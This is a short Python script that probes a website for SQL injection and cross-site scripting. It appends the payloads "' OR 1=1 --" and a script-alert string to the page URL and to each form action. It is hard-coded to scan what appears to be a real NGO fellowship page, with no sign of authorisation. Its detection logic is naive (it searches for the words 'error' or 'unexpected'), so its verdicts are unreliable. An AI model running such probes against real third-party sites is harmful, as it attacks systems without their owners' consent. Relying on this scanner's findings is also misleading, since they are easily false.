import requests
from bs4 import BeautifulSoup


def check_sql_injection(url):
    payload = "' OR 1=1 --"
    response = requests.get(url + payload)

    if "error" in response.text or "unexpected" in response.text:
        print(f"SQL Injection Vulnerability detected at: {url}")
    else:
        print(f"No SQL Injection vulnerability found at: {url}")


def check_xss(url):
    xss_payload = '<script>alert("XSS")</script>'
    response = requests.get(url + xss_payload)

    if xss_payload in response.text:
        print(f"XSS Vulnerability detected at: {url}")
    else:
        print(f"No XSS vulnerability found at: {url}")


def scan_website(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')

        print(f"Scanning URL: {url}")
        check_sql_injection(url)
        check_xss(url)

        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            if action:
                full_url = url + action
                print(f"Scanning form action: {full_url}")
                check_sql_injection(full_url)
                check_xss(full_url)
    except requests.exceptions.RequestException as e:
        print(f"Error scanning {url}: {e}")


if __name__ == "__main__":
    target_url = "https://fellowship.bhumi.ngo/?utm_term=bhumi%20foundation%20trust&utm_source=adwords&utm_medium=ppc&utm_campaign=&hsa_net=adwords&hsa_grp=133875397654&hsa_mt=b&hsa_tgt=kwd-1646497304288&hsa_kw=bhumi%20foundation%20trust&hsa_src=g&hsa_acc=7275967791&hsa_cam=16766000832&hsa_ver=3&hsa_ad=651181885675&gad_source=1&gclid=Cj0KCQiAvP-6BhDyARIsAJ3uv7YarU_2hwHQ2FuPZaEgFljJE88sKufb0RmyrW_fhh6MqlN6hGVI3r8aAmhBEALw_wcB"
    scan_website(target_url)
